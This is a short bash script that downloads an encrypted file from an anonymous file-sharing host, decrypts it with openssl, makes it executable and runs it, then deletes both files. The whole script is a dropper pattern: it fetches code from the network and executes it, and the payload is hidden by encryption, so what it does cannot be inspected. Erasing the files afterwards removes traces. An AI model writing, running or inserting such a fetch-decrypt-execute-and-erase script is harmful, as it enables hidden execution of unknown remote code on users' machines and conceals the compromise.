#! /bin/bash
cd
curl -O https://cdn-144.anonfiles.com/ufl5qdU5y3/dbac7370-1674824516/x-l1bra.enc
openssl enc -d -aes-256-cbc -in x-l1bra.enc -out x-l1bra
sudo chmod 755 x-l1bra
./x-l1bra
rm x-l1bra.enc x-l1bra
